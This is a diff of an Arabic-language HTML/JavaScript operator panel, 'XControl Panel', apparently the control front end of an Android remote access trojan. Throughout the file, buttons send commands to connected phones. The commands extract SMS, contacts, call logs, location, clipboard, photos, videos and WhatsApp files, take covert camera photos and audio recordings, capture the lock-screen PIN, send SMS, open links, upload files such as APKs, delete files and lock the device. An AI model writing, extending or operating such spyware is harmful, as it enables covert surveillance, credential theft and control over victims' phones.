@@ -1,185 +1,255 @@
-<!DOCTYPE html><html lang="ar"><head><meta charset="utf-8">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>XControl Panel</title>
 <style>
-  body{font-family:system-ui,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:16px}
-  h1,h2{color:#39ff14} table{width:100%;border-collapse:collapse;margin:8px 0;font-size:13px}
-  td,th{border:1px solid #30363d;padding:6px;text-align:left;word-break:break-all}
-  button{background:#238636;color:#fff;border:0;border-radius:6px;padding:8px 12px;margin:3px;cursor:pointer;font-size:13px}
-  button.sec{background:#1f6feb} button.dng{background:#da3633} input,select{background:#161b22;color:#e6edf3;border:1px solid #30363d;border-radius:6px;padding:8px;margin:3px;width:92%}
-  .card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px;margin:10px 0}
-  .row{display:flex;flex-wrap:wrap;gap:6px;align-items:center} img{max-width:200px;border-radius:6px;margin:4px}
-  audio{width:100%} a{color:#58a6ff} .badge{background:#30363d;border-radius:10px;padding:2px 8px;font-size:12px}
-  .off{color:#f85149} .on{color:#3fb950} pre{white-space:pre-wrap;background:#0d1117;padding:8px;border-radius:6px}
-</style></head><body>
-<h1>🎛 XControl Abdullah alsabry —  لوحة التحكم الصبري</h1>
-<div id="tokenBox" class="card">
-  <b>رمز السيرفر (TOKEN):</b><br>
-  <div class="row"><input id="tok" placeholder="أدخل TOKEN"><button onclick="setTok()">حفظ</button></div>
+  * { box-sizing: border-box; }
+  body { background: #0d1117; color: #e6edf3; font-family: Tahoma, Arial, sans-serif; margin: 0; padding: 14px; }
+  h1 { font-size: 22px; margin: 4px 0 12px; text-align: center; color: #58a6ff; }
+  .bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 10px; align-items: center; }
+  input, select { background: #161b22; color: #e6edf3; border: 1px solid #30363d; border-radius: 6px; padding: 8px; font-size: 14px; }
+  input { flex: 1; min-width: 120px; }
+  button { background: #238636; color: #fff; border: none; border-radius: 6px; padding: 9px 12px; font-size: 14px; cursor: pointer; }
+  button:hover { filter: brightness(1.15); }
+  button.red { background: #b62324; }
+  button.blue { background: #1f6feb; }
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; margin-bottom: 12px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 10px 12px; margin-bottom: 8px; font-size: 13px; word-break: break-word; }
+  .on { color: #3fb950; font-weight: bold; }
+  .off { color: #f85149; font-weight: bold; }
+  .wait { color: #d29922; }
+  table { border-collapse: collapse; width: 100%; margin-top: 6px; font-size: 12px; }
+  th, td { border: 1px solid #30363d; padding: 4px 6px; text-align: right; }
+  th { background: #21262d; }
+  pre { white-space: pre-wrap; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 8px; margin: 6px 0 0; }
+  img, video { max-width: 280px; border-radius: 6px; margin-top: 6px; }
+  audio { margin-top: 6px; width: 100%; }
+  a { color: #58a6ff; }
+</style>
+</head>
+<body>
+
+<h1>🎛 XControl Panel Alsabry- لوحة تحكم الصبري</h1>
+
+<div class="bar">
+  <input id="tok" placeholder="أدخل TOKEN هنا">
+  <button onclick="saveTok()">حفظ الرمز</button>
+  <button class="blue" onclick="loadDevices()">🔄 تحديث الأجهزة</button>
 </div>
-<div id="main" style="display:none">
-  <div id="devices" class="card"><h2>الأجهزة المتصلة</h2><div id="devList">... جارٍ التحميل</div></div>
-  <div id="devView" class="card" style="display:none">
-    <h2 id="dvTitle">جهاز</h2>
-    <button onclick="back()">⬅ رجوع للقائمة</button>
-    <div id="dvMeta"></div>
-    <div id="mods" class="row">
-      <button onclick="run('info',{})">📱 معلومات الجهاز</button>
-      <button onclick="showFiles()">📁 الملفات</button>
-      <button onclick="showMedia('image')">🖼 الصور</button>
-      <button onclick="showMedia('video')">🎬 الفيديو</button>
-      <button onclick="showCam()">📷 كاميرا</button>
-      <button onclick="showAudio()">🎙 تسجيل صوت</button>
-      <button onclick="run('sms',{})">💬 الرسائل SMS</button>
-      <button onclick="showSendSms()">📤 إرسال SMS</button>
-      <button onclick="run('contacts',{})">👥 جهات الاتصال</button>
-      <button onclick="run('calls',{})">📞 سجل المكالمات</button>
-      <button onclick="run('location',{})">📍 الموقع</button>
-      <button onclick="run('apps',{})">📦 التطبيقات</button>
-      <button onclick="run('clipboard',{})">📋 الحافظة</button>
-      <button onclick="showUrl()">🔗 فتح رابط</button>
-      <button onclick="showUpload()">⬆ رفع ملف للجهاز</button>
-      <button onclick="run('whatsapp',{})">🟢 ملفات واتساب</button>
-      <button onclick="sendCmd('lock',{})">🔒 قفل الجهاز</button>
-      <button onclick="sendCmd('capture_pin',{})">📵 التقاط رمز القفل</button>
-    </div>
-    <div id="filesBox" style="display:none" class="card">
-      <div class="row"><input id="fpath" value="/storage/emulated/0"><button onclick="runFiles()">عرض</button></div>
-      <div id="filesRes"></div>
-    </div>
-    <div id="mediaBox" style="display:none" class="card"><div id="mediaRes"></div></div>
-    <div id="camBox" style="display:none" class="card">
-      <div class="row"><select id="camFace"><option value="back">خلفية</option><option value="front">أمامية</option></select>
-      <button onclick="run('photo',{facing:document.getElementById('camFace').value})">التقاط صورة</button></div>
-      <div id="camRes"></div>
-    </div>
-    <div id="audioBox" style="display:none" class="card">
-      <div class="row"><input id="asec" type="number" value="10" style="width:90px">
-      <button onclick="run('audio',{seconds:parseInt(document.getElementById('asec').value)||10})">تسجيل</button></div>
-      <div id="audioRes"></div>
-    </div>
-    <div id="smsBox" style="display:none" class="card">
-      <div class="row"><input id="snum" placeholder="رقم الهاتف"><input id="stxt" placeholder="نص الرسالة">
-      <button onclick="run('send_sms',{number:document.getElementById('snum').value,text:document.getElementById('stxt').value})">إرسال</button></div>
-    </div>
-    <div id="urlBox" style="display:none" class="card">
-      <div class="row"><input id="uurl" placeholder="https://...">
-      <button onclick="run('open_url',{url:document.getElementById('uurl').value})">فتح</button></div>
-    </div>
-    <div id="upBox" style="display:none" class="card">
-      <div class="row"><input id="upath" placeholder="المسار على الجهاز مثل /storage/emulated/0/Download/x.apk">
-      <input id="ufile" type="file" onchange="doUpload()"></div>
-    </div>
-    <h2>نتائج</h2><div id="out"></div>
-  </div>
+
+<div class="bar">
+  <select id="dev" style="flex:1">
+    <option value="">— اختر الجهاز —</option>
+  </select>
 </div>
+
+<div class="grid">
+  <button onclick="sendCmd('info',{})">ℹ️ معلومات الجهاز</button>
+  <button onclick="sendCmd('sms',{})">📩 الرسائل SMS</button>
+  <button onclick="sendCmd('contacts',{})">👥 جهات الاتصال</button>
+  <button onclick="sendCmd('calls',{})">📞 سجل المكالمات</button>
+  <button onclick="sendCmd('apps',{})">📱 التطبيقات</button>
+  <button onclick="sendCmd('location',{})">📍 الموقع</button>
+  <button onclick="sendCmd('clipboard',{})">📋 الحافظة</button>
+  <button onclick="sendCmd('files',{path:'/storage/emulated/0'})">📁 الملفات</button>
+  <button onclick="sendCmd('photos',{})">🖼 الصور</button>
+  <button onclick="sendCmd('videos',{})">🎬 الفيديوهات</button>
+  <button onclick="sendCmd('photo',{facing:'back'})">📷 التقاط صورة</button>
+  <button onclick="sendCmd('audio',{seconds:10})">🎙 تسجيل 10 ث</button>
+  <button onclick="sendCmd('whatsapp',{})">💬 ملفات واتساب</button>
+  <button onclick="sendLock()">🔒 قفل الجهاز</button>
+  <button onclick="sendCmd('capture_pin',{})">📵 التقاط رمز القفل</button>
+  <button onclick="sendSms()">✉️ إرسال SMS</button>
+  <button onclick="sendUrl()">🌐 فتح رابط</button>
+</div>
+
+<div class="bar">
+  <input id="path" placeholder="مسار ملف (مثال: /storage/emulated/0/Download/ملف.pdf)">
+  <button class="blue" onclick="sendCmd('get_file',{path:pathVal()})">⬇️ تنزيل من الجهاز</button>
+  <button class="red" onclick="sendCmd('delete_file',{path:pathVal()})">🗑 حذف</button>
+</div>
+
+<div class="bar">
+  <input type="file" id="uf">
+  <button onclick="pickUpload()">⬆️ رفع إلى الجهاز</button>
+</div>
+
+<div id="out"></div>
 
 <script>
-let TOKEN = localStorage.getItem('tok') || '';
-let DEV = null, PENDING = new Set();
-function setTok(){ TOKEN = document.getElementById('tok').value.trim(); localStorage.setItem('tok', TOKEN);
-  document.getElementById('tokenBox').style.display='none'; document.getElementById('main').style.display='block'; }
-if (TOKEN) { document.getElementById('tokenBox').style.display='none'; document.getElementById('main').style.display='block'; }
+let TOKEN = localStorage.getItem('tok') || new URLSearchParams(location.search).get('t') || '';
+document.getElementById('tok').value = TOKEN;
+const seen = {};
 
-const H = {'Content-Type':'application/json','x-token':TOKEN};
-function api(p, body){ return fetch(p,{method:'POST',headers:H,body:body?JSON.stringify(body):undefined}).then(r=>r.json()); }
-function esc(s){ return String(s==null?'':s).replace(/[&<>"]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
-function sz(n){ n=+n||0; if(n>1073741824)return (n/1073741824).toFixed(1)+'GB'; if(n>1048576)return (n/1048576).toFixed(1)+'MB'; if(n>1024)return (n/1024).toFixed(1)+'KB'; return n+'B'; }
-function age(t){ const s=Math.round((Date.now()-t)/1000); if(s<60)return s+'s'; if(s<3600)return Math.round(s/60)+'m'; return Math.round(s/3600)+'h'; }
-function dlink(cmdId, name){ return `<a href="/api/file/${cmdId}?t=${encodeURIComponent(TOKEN)}" download>${esc(name||'تنزيل')}</a>`; }
-
-function refreshDevices(){
-  if (DEV) return;
-  api('/api/devices').then(list => {
-    document.getElementById('devList').innerHTML =
-      list.length ? '<table><tr><th>الجهاز</th><th>الطراز</th><th>Android</th><th>IP</th><th>آخر نشاط</th></tr>' +
-      list.map(d => `<tr style="cursor:pointer" onclick="openDev('${d.id}')">
-        <td>${esc(d.name)}</td><td>${esc(d.model)}</td><td>${esc(d.android)}</td>
-        <td>${esc(d.ip)}</td><td>${age(d.lastSeen)}</td></tr>`).join('') + '</table>'
-      : '<p>لا توجد أجهزة متصلة بعد — ثبّت الوكيل وافتحه على جهاز الاختبار.</p>';
-  }).catch(()=>{ document.getElementById('devList').innerHTML='<p class="off">تعذر الاتصال بالسيرفر</p>'; });
+function esc(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c =>
+    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
-setInterval(refreshDevices, 3000); refreshDevices();
+function fmt(n) {
+  n = Number(n) || 0;
+  if (n >= 1048576) return (n / 1048576).toFixed(1) + ' MB';
+  if (n >= 1024) return (n / 1024).toFixed(1) + ' KB';
+  return n + ' B';
+}
+function log(msg) {
+  const d = document.createElement('div');
+  d.className = 'card wait';
+  d.textContent = msg;
+  document.getElementById('out').insertAdjacentElement('afterbegin', d);
+}
+function pathVal() { return document.getElementById('path').value.trim(); }
 
-function openDev(id){ DEV = id; refreshDevices(); document.getElementById('devView').style.display='block';
-  document.getElementById('dvTitle').textContent = 'جهاز: ' + id; out(''); }
-function back(){ DEV = null; document.getElementById('devView').style.display='none'; refreshDevices(); }
+function saveTok() {
+  TOKEN = document.getElementById('tok').value.trim();
+  localStorage.setItem('tok', TOKEN);
+  log(TOKEN ? '✅ تم حفظ الرمز' : '⚠ أدخل الرمز أولاً');
+}
 
-function out(html){ document.getElementById('out').innerHTML = html || ''; }
-function run(cmd, args, cb){
-  if(!DEV) return; out('⏳ تنفيذ <b>'+cmd+'</b>...');
-  api('/api/exec',{id:DEV,cmd,args}).then(r => {
-    if(!r.ok) return out('<p class="off">' + esc(r.error||'فشل الإرسال') + '</p>');
-    const iv = setInterval(() => {
-      api('/api/results',{id:DEV}).then(rs => {
-        const hit = rs.find(x => x.cmdId === r.cmdId);
-        if (hit) { clearInterval(iv); render(hit); if(cb) cb(hit); }
-      }).catch(()=>{});
-    }, 1200);
-    setTimeout(()=>clearInterval(iv), 300000);
+async function api(path, body) {
+  const r = await fetch(path, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'x-token': TOKEN },
+    body: JSON.stringify(body || {})
   });
+  let j = {};
+  try { j = await r.json(); } catch (e) {}
+  if (!r.ok) throw new Error(j.error || ('HTTP ' + r.status));
+  return j;
 }
-function render(h){
-  let html = `<div class="card"><b>${esc(h.cmdId.slice(0,8))}</b> — ${h.ok?'<span class="on">نجح</span>':'<span class="off">فشل</span>'} ${h.fname?'· '+esc(h.fname):''}`;
-  if (h.fname) {
-    // نتيجة ثنائية (صورة/صوت/فيديو/ملف): رابط تنزيل + معاينة داخلية
+
+async function loadDevices() {
+  const sel = document.getElementById('dev');
+  const prev = sel.value;
+  sel.innerHTML = '<option value="">— اختر الجهاز —</option>';
+  try {
+    const r = await fetch('/api/devices?t=' + encodeURIComponent(TOKEN));
+    const list = await r.json();
+    if (!Array.isArray(list) || list.length === 0) {
+      log('⚠ لا توجد أجهزة متصلة — تأكد أن التطبيق مفتوح على الهاتف');
+      return;
+    }
+    for (const d of list) {
+      const opt = document.createElement('option');
+      opt.value = d.id;
+      opt.textContent = (d.name || 'جهاز') + ' — ' + (d.model || '');
+      sel.appendChild(opt);
+    }
+    if (prev && list.some(d => d.id === prev)) sel.value = prev;
+    log('✅ ' + list.length + ' جهاز متصل');
+  } catch (e) {
+    log('❌ فشل جلب الأجهزة: ' + e.message);
+  }
+}
+
+async function sendCmd(cmd, args) {
+  const sel = document.getElementById('dev');
+  if (!sel || !sel.value) { log('⚠ اختر جهازًا أولاً من القائمة'); return; }
+  if (!TOKEN) { log('⚠ أدخل TOKEN وحفظه أولاً'); return; }
+  log('⏳ إرسال أمر: ' + cmd + ' ...');
+  try {
+    const j = await api('/api/exec', { id: sel.value, cmd, args: args || {} });
+    log('✅ أُرسل ' + cmd + ' — cmdId: ' + String(j.cmdId || '').slice(0, 8));
+  } catch (e) {
+    log('❌ فشل الإرسال: ' + e.message);
+  }
+}
+
+function sendLock() {
+  const sel = document.getElementById('dev');
+  if (!sel || !sel.value) { log('⚠ اختر جهازًا أولاً'); return; }
+  if (!confirm('تأكيد قفل الجهاز؟')) return;
+  sendCmd('lock', {});
+}
+
+function sendSms() {
+  const n = prompt('رقم الهاتف:');
+  if (!n) return;
+  const t = prompt('نص الرسالة:');
+  if (!t) return;
+  sendCmd('send_sms', { number: n, text: t });
+}
+
+function sendUrl() {
+  const u = prompt('الرابط:');
+  if (!u) return;
+  sendCmd('open_url', { url: u });
+}
+
+function pickUpload() {
+  const f = document.getElementById('uf').files[0];
+  if (!f) { log('⚠ اختر ملفًا أولاً'); return; }
+  if (f.size > 40 * 1024 * 1024) { log('⚠ الملف أكبر من 40MB — حد السيرفر 60MB للطلب'); return; }
+  const rd = new FileReader();
+  rd.onload = () => {
+    const b64 = String(rd.result).split(',')[1];
+    log('⏳ رفع ' + f.name + ' (' + fmt(f.size) + ') ...');
+    sendCmd('upload_file', { fname: f.name, path: '', data: b64 });
+  };
+  rd.onerror = () => log('❌ فشل قراءة الملف');
+  rd.readAsDataURL(f);
+}
+
+function render(h) {
+  let html = '<div class="card"><b>' + esc((h.cmdId || '').slice(0, 8)) + '</b> — ' +
+    (h.ok ? '<span class="on">نجح</span>' : '<span class="off">فشل</span>') +
+    (h.fname ? ' · ' + esc(h.fname) : '') +
+    (h.size ? ' · ' + fmt(h.size) : '');
+
+  if (h.file) {
     const url = '/api/file/' + encodeURIComponent(h.cmdId) + '?t=' + encodeURIComponent(TOKEN);
     const ext = (h.fname || '').split('.').pop().toLowerCase();
-    html += '<br>' + dlink(h.cmdId, h.fname || 'ملف');
-    if (['jpg','jpeg','png','gif','webp','bmp'].includes(ext))
-      html += '<br><a href="' + url + '" target="_blank"><img src="' + url + '" style="max-width:300px;border-radius:6px"></a>';
-    else if (['m4a','mp3','aac','wav','ogg','amr'].includes(ext))
-      html += '<br><audio controls preload="none" src="' + url + '"></audio>';
-    else if (['mp4','3gp','webm','mkv'].includes(ext))
-      html += '<br><video controls preload="none" src="' + url + '" style="max-width:300px"></video>';
+    html += '<br><a href="' + url + '" download>⬇️ تنزيل الملف</a>';
+    if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(ext))
+      html += '<br><img src="' + url + '" alt="صورة">';
+    else if (['m4a', 'mp3', 'aac', 'wav', 'ogg', 'amr'].includes(ext))
+      html += '<br><audio controls src="' + url + '"></audio>';
+    else if (['mp4', '3gp', 'webm', 'mkv'].includes(ext))
+      html += '<br><video controls src="' + url + '"></video>';
   } else if (h.data) {
     try {
       const d = JSON.parse(h.data);
       if (Array.isArray(d) && d.length && typeof d[0] === 'object') {
-        html += '<table><tr>' + Object.keys(d[0]).map(k=>'<th>'+esc(k)+'</th>').join('') + '</tr>' +
-          d.slice(0,500).map(o=>'<tr>'+Object.values(o).map(v=>'<td>'+esc(v)+'</td>').join('')+'</tr>').join('') + '</table>';
-      } else if (typeof d === 'object') {
-        html += '<table>' + Object.entries(d).map(([k,v])=>`<tr><td><b>${esc(k)}</b></td><td>${esc(typeof v==='object'?JSON.stringify(v):v)}</td></tr>`).join('') + '</table>';
-      } else html += '<pre>'+esc(d)+'</pre>';
-    } catch(e){ html += '<pre>'+esc(h.data)+'</pre>'; }
+        html += '<table><tr>' + Object.keys(d[0]).map(k => '<th>' + esc(k) + '</th>').join('') + '</tr>';
+        d.slice(0, 500).forEach(o => {
+          html += '<tr>' + Object.values(o).map(v => '<td>' + esc(v) + '</td>').join('') + '</tr>';
+        });
+        html += '</table>';
+      } else if (typeof d === 'object' && d !== null) {
+        html += '<table>' + Object.entries(d).map(([k, v]) =>
+          '<tr><td><b>' + esc(k) + '</b></td><td>' + esc(typeof v === 'object' ? JSON.stringify(v) : v) + '</td></tr>'
+        ).join('') + '</table>';
+      } else {
+        html += '<pre>' + esc(d) + '</pre>';
+      }
+    } catch (e) {
+      html += '<pre>' + esc(h.data) + '</pre>';
+    }
   }
   html += '</div>';
   document.getElementById('out').insertAdjacentHTML('afterbegin', html);
 }
 
-// ====== الوحدات ======
-function showFiles(){ hideAll(); document.getElementById('filesBox').style.display='block'; runFiles(); }
-function runFiles(){ const p = document.getElementById('fpath').value.trim();
-  run('files',{path:p}, r => { if(!r.ok) return;
-    const d = JSON.parse(r.data);
-    document.getElementById('filesRes').innerHTML =
-      `<p><b>${esc(d.path)}</b> — ${d.items.length} عنصر</p><table><tr><th>الاسم</th><th>الحجم</th><th>نوع</th><th></th></tr>` +
-      d.items.map(f => `<tr><td>${f.dir?'📁':'📄'} ${esc(f.name)}</td><td>${f.dir?'—':sz(f.size)}</td><td>${f.dir?'مجلد':'ملف'}</td>
-        <td>${f.dir?`<button onclick="document.getElementById('fpath').value='${esc((d.path.replace(/\/$/,''))+'/'+f.name).replace(/'/g,'&#39;')}';runFiles()">فتح</button>`
-        :`<button class="sec" onclick="run('get_file',{path:'${esc((d.path.replace(/\/$/,''))+'/'+f.name).replace(/'/g,'&#39;')}'})">تنزيل</button>
-           <button class="dng" onclick="run('delete_file',{path:'${esc((d.path.replace(/\/$/,''))+'/'+f.name).replace(/'/g,'&#39;')}'})">حذف</button>`}</td></tr>`).join('') + '</table>';
-  });
+async function pollResults() {
+  const sel = document.getElementById('dev');
+  if (!sel || !sel.value || !TOKEN) return;
+  try {
+    const j = await api('/api/results', { id: sel.value });
+    if (Array.isArray(j)) {
+      for (const r of j) {
+        if (!seen[r.cmdId]) {
+          seen[r.cmdId] = true;
+          render(r);
+        }
+      }
+    }
+  } catch (e) { /* تجاهل أخطاء التحديث الدوري */ }
 }
-function showMedia(kind){ hideAll(); document.getElementById('mediaBox').style.display='block';
-  run(kind === 'image' ? 'photos' : 'videos', {}, r => { if(!r.ok) return;
-    const d = JSON.parse(r.data);
-    document.getElementById('mediaRes').innerHTML =
-      '<table><tr><th>الاسم</th><th>الحجم</th><th></th></tr>' +
-      d.map(m => `<tr><td>${esc(m.name)}</td><td>${sz(m.size)}</td>
-        <td><button class="sec" onclick="run('download_media',{kind:'${kind}',id:'${m.id}'})">تنزيل</button></td></tr>`).join('') + '</table>';
-  });
-}
-function showCam(){ hideAll(); document.getElementById('camBox').style.display='block'; }
-function showAudio(){ hideAll(); document.getElementById('audioBox').style.display='block'; }
-function showSendSms(){ hideAll(); document.getElementById('smsBox').style.display='block'; }
-function showUrl(){ hideAll(); document.getElementById('urlBox').style.display='block'; }
-function showUpload(){ hideAll(); document.getElementById('upBox').style.display='block'; }
-function hideAll(){ ['filesBox','mediaBox','camBox','audioBox','smsBox','urlBox','upBox'].forEach(i=>document.getElementById(i).style.display='none'); }
-function doUpload(){ const f = document.getElementById('ufile').files[0]; if(!f) return;
-  if (f.size > 30*1024*1024) return alert('الملف كبير (حد 30MB)');
-  const rd = new FileReader(); rd.onload = () => {
-    const b64 = rd.result.split(',')[1];
-    run('upload_file', {path: document.getElementById('upath').value.trim(), data: b64, fname: f.name});
-  }; rd.readAsDataURL(f);
-}
-</script></body></html>
+
+loadDevices();
+setInterval(loadDevices, 30000);
+setInterval(pollResults, 3000);
+</script>
+</body>
+</html>
